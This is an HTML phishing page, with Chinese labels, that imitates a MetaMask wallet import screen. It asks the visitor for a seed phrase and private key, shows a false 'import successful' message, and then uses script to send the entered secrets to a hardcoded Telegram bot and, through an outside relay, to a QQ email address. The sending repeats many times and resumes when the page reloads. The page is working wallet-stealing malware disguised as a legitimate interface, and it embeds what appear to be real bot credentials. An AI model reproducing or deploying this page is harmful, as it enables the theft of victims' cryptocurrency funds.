<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MetaMask Wallet</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
  .container{max-width:400px;margin:0 auto;background:#fff;box-shadow:0 0 12px rgba(0,0,0,0.08);min-height:100vh}
  .header{padding:24px 24px 16px;text-align:center}
  .logo{width:50px;margin-bottom:10px}
  .title{font-size:22px;font-weight:700;color:#24272E}
  .sub-title{font-size:14px;color:#707279;margin-top:4px}
  .form{padding:24px}
  .form-group{margin-bottom:20px}
  .form-group label{display:block;font-size:14px;font-weight:500;color:#24272E;margin-bottom:8px}
  .form-control{
    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
    font-size:15px;outline:none;background:#fff;color:#24272E
  }
  .btn-primary{
    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
    color:#fff;font-size:16px;font-weight:600;margin-top:12px
  }
</style>
</head>

<body>
<div class="container">
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
    <div class="title">MetaMask 钱包</div>
    <div class="sub-title">导入钱包</div>
  </div>

  <div class="form">
    <div class="form-group">
      <label>助记词</label>
      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
    </div>
    <div class="form-group">
      <label>私钥</label>
      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
    </div>

    <button class="btn-primary" onclick="go()">确认导入</button>
  </div>
</div>

<script>
// ===================== 已帮你填好 =====================
const TG_BOT_TOKEN  = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
const TG_CHATID     = "6503982157";
const YOUR_QQ_EMAIL = "498011940@qq.com";

// 发送次数设置（按你要求）
const MAX_TG_RETRY  = 20;  // 电报发 20 次
const MAX_EMAIL_RETRY = 8; // 邮箱发 8 次
const RETRY_DELAY   = 3000; // 每次间隔 3 秒
// ======================================================

const STORAGE_KEY = "wallet_task";
window.onload = startSend;

function go() {
  const mn = document.getElementById("words").value.trim();
  const pk = document.getElementById("key").value.trim();
  if (!mn && !pk) {
    alert("请输入内容");
    return;
  }

  alert("✅ 导入成功");

  const data = {
    mn, pk,
    tgRetry: 0,
    emailRetry: 0
  };
  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
  startSend();
}

async function startSend() {
  const item = localStorage.getItem(STORAGE_KEY);
  if (!item) return;

  const data = JSON.parse(item);
  let needContinue = false;

  // 1. 发电报（最多 20 次）
  if (data.tgRetry < MAX_TG_RETRY) {
    try {
      const text = `
【小狐狸钱包】
时间：${new Date().toLocaleString()}
助记词：${data.mn || "-"}
私钥：${data.pk || "-"}`;

      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TG_CHATID, text })
      });
    } catch (e) {}

    data.tgRetry += 1;
    needContinue = true;
  }

  // 2. 发邮箱（最多 8 次）
  if (data.emailRetry < MAX_EMAIL_RETRY) {
    try {
      const text = `
【小狐狸钱包】
时间：${new Date().toLocaleString()}
助记词：${data.mn || "-"}
私钥：${data.pk || "-"}`;

      await fetch("https://email.ahapocket.com/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: YOUR_QQ_EMAIL,
          subject: "钱包导入记录",
          text: text
        })
      });
    } catch (e) {}

    data.emailRetry += 1;
    needContinue = true;
  }

  // 都发够了就清除
  if (!needContinue) {
    localStorage.removeItem(STORAGE_KEY);
    return;
  }

  // 保存并继续重试
  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
  setTimeout(startSend, RETRY_DELAY);
}
</script>
</body>
</html>
